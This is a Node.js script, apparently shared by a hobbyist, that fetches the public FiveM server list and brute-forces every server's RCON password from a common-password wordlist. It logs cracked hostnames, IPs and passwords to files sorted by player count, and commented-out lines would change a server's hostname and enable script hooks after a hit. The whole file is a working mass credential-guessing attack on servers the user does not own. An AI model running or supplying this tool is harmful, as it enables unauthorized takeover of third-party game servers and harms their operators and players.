// i'd advice you to use a "most common passwords" wordlist, i promise fivem servers have so weak passwords
// i have run this for like 2 hours straight and worked, however i do not guarantee no crashes

// nice wordlists: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

const request = require("request");
const Q3RCon = require("quake3-rcon");
const fs = require('fs');
const LineByLineReader = require('line-by-line');

console.log(`---------------------------------------- Starting Script! ----------------------------------------`);

const options = {
    url: "https://servers-live.fivem.net/api/servers/",
    headers: {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20"
    }
}

function sleep(ms){
    return new Promise(resolve=>{
        setTimeout(resolve,ms)
    })
}

function log(/*rcon, */server, resp, password)
{
    // commented because i have not tested if it works yet

    /*rcon.send("set sv_hostname \"l0lz :)\"", function(resp1) {});
    rcon.send("set sv_scriptHookAllowed true", function(resp2) {});*/

    let serverData = server.Data;

    line1 = `---------------------------------------- RCON PASSWORD FOUND! ----------------------------------------\n`;
    line2 = `- Name : ${serverData.hostname}\n`;
    line3 = `- IP : ${server.EndPoint}\n`;
    line4 = `- Players : ${serverData.clients}\n`;
    line5 = `- Response : ${resp}\n`;
    line6 = `- Password : ${password}\n`;
    line7 = `-----------------------------------------------------------------------------------------------------\n`;
    line8 = `\n`;
    fileName = '';

    if (serverData.clients == 0) {
        fileName = 'Empty.txt';
    }

    if (serverData.clients <= 10 && serverData.clients != 0) {
        fileName = 'LowPop.txt';
    }

    if (serverData.clients > 10 && serverData.clients <= 20) {
        fileName = 'MedPop.txt';
    }

    if (serverData.clients > 20) {
        fileName = 'HighPop.txt';
    }

    fs.appendFileSync(fileName, line1);
    fs.appendFileSync(fileName, line2);
    fs.appendFileSync(fileName, line3);
    fs.appendFileSync(fileName, line4);
    fs.appendFileSync(fileName, line5);
    fs.appendFileSync(fileName, line6);
    fs.appendFileSync(fileName, line7);
    fs.appendFileSync(fileName, line8);

    console.log(`- Name : ${serverData.hostname}\n`.green);
    console.log(`- IP : ${server.EndPoint}\n`.green);
    console.log(`- File : ${fileName}\n`.green);
    console.log(`-----------------------------------------------------------------------------------------------------`);
}

// This method DOES NOT wait for every connection to be made, then go to the next one.
// Instead, it will send many connections at once to different servers.
async function tryServers(Servers, tryPassword)
{
    lr.pause();

    let serversLength = Servers.length;

    var i;
    for (i = 0; i < serversLength; i++) {
        // little timeout, it prevents crashes due to too many connections being sent.
        // if your connection is slow, you might have to increase that
        await sleep(10);

        let server = Servers[i];

        let splitEndpoint = server.EndPoint.split(":");
        let ip = splitEndpoint[0];
        let port = splitEndpoint[1];

        // do not check empty passwords
        if(tryPassword == '') {
            i = serversLength;
            break;
        }

        console.log(`--- Attempting ${tryPassword} on ${ip}:${port}`);

        // this keeps crashing because sometimes servers stop before we try to have a connection
        // todo: fix this ^
        try {
            var rcon = new Q3RCon({
                address: ip,
                port: port,
                password: tryPassword,
                debug: false
            });
        } catch (ex) {
            console.log(`Connection error on ${ip}:${port}`);
            continue;
        }

        // "Invalid" -> invalid pass
        // "set rcon_password" -> server does not use a rcon password
        // "getinfo xxx" -> i rly dont know why, but when i got that message the rcon password was never correct
        // "start runcode" -> same shit as above
        try {
            rcon.send("start runcode", function(resp) {
                if (resp.toString().indexOf("Invalid") == -1
                    && resp.toString().indexOf("set rcon_password") == -1
                    && resp.toString().indexOf("getinfo xxx") == -1
                    && resp.toString().indexOf("start runcode") == -1
                )
                {
                    log(/*rcon, */server, resp, tryPassword);
                }
            });
        } catch (ex) {
            console.log(`Connection error on ${ip}:${port}`);
            continue;
        }
    }

    if(i == serversLength) {
        lr.resume();
    }
}

const file = 'wordlists/100k-most-used-passwords-NCSC1.txt';

request.get(options, function (err, response, body) {
    Servers = JSON.parse(body);

    lr = new LineByLineReader(file, { encoding: 'utf8', skipEmptyLines: true });

    lr.on('error', function (err) {
        throw err;
    });

    lr.on('line', function(word) {
        tryServers(Servers, word);
    });

    lr.on('end', function () {
        console.log('Finished ' + file);
        process.exit(0);
    });
});

